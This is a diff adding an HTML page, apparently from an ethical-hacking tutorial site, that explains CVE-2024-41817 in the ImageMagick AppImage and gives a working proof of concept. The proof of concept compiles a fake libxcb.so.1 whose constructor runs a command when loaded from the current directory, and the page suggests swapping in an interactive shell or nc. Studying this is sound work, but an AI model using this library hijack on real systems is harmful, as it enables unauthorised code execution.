@@ -1,0 +1,88 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/cve/cve.css' %}">
+</head>
+<body>
+    <h1 class="title">ImageMagick 7.1.1.1-35 : CVE-2024-41817</h1>
+    <p class="text">The AppImage's AppRun script incorrectly constructs MAGICK_CONFIGURE_PATH and LD_LIBRARY_PATH when the corresponding environment variables are unset.</p>
+    <p class="text"> This often results in empty path entries like :: or :/usr/lib, causing ImageMagick to search in the current working directory (CWD) for configuration files or shared libraries. </p>
+
+    <h2 class="subtitle">Source code</h2>
+    <div class="code-box"><pre><code> export MAGICK_CONFIGURE_PATH=$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16"):$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16HDRI"):$(readlink -f "$HERE/usr/share/ImageMagick-7"):$(readlink -f "$HERE/usr/etc/ImageMagick-7"):$MAGICK_CONFIGURE_PATH
+  
+ export LD_LIBRARY_PATH=$(readlink -f "$HERE/usr/lib"):$LD_LIBRARY_PATH 
+ export LD_LIBRARY_PATH=${HERE}/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:$LD_LIBRARY_PATH</code></pre></div>
+
+ <p class="text">When the ImageMagick AppImage is launched, its startup script (AppRun) fails to sanitize or correctly set the LD_LIBRARY_PATH environment variable.</p>
+ <h3>If LD_LIBRARY_PATH is unset:</h3>
+ <div class="code-box"><pre><code>LD_LIBRARY_PATH=:/usr/lib  # This script doesn't have prefix.</code></pre></div>
+ <p class="text">This is empty prefix. Therefore, this app will look in the current directory, and then in /usr/lib, when resolving shared libraries.</p>
+
+    <p class="text"><strong>The colon at the beginning (:) implies an empty prefix.</strong> Therefore, this expression is like this...</p>
+    <div class="code-box"><pre><code>LD_LIBRARY_PATH=./:/usr/lib</code></pre></div>
+    
+
+
+ <h2 class="subtitle">Exploit</h2>
+ <p class="text">Create fake file which pretends it is library for ImageMagick.</p>
+ <p class="text">Since LD_LIBRARY_PATH is not set correctly, we can fake it.</p>
+ <div class="code-box"><pre><code>gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("id");
+    exit(0);
+}
+EOF</code></pre></div>
+
+<h2 class="subtitle">Step by step</h2>
+<div class="code-box"><pre><code>gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+...
+EOF
+</code></pre></div>
+
+<table>
+    <thead>
+        <tr>
+            <th>Option</th>
+            <th>Meaning</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>-x c</td>
+            <td>Treat the input as C source code (from stdin)</td>
+        </tr>
+        <tr>
+            <td>-shared</td>
+            <td>Build a shared object (.so) instead of executable</td>
+        </tr>
+        <tr>
+            <td>-fPIC</td>
+            <td>Generate Position-Independent Code (for linking)</td>
+        </tr>
+        <tr>
+            <td>-o libxcb.so.1</td>
+            <td>Output filename: the fake library you're injecting</td>
+        </tr>
+    </tbody>
+</table>
+
+<h3>C part</h3>
+<div class="code-box"><pre><code>__attribute__((constructor)) void init(){
+    system("id");
+    exit(0);
+}
+</code></pre></div>
+<p class="text"><strong>__attribute__((constructor))</strong> : tells the compiler to run init() immediately when the library is loaded, before any other function runs.</p>
+<p class="text"><strong>system("id")</strong> : runs the id command (or you could do bash -i, nc, etc.)</p>
+<p class="text"><strong>exit(0)</strong> : exits right after, to avoid crashing the caller</p>
+</body>
+</html>
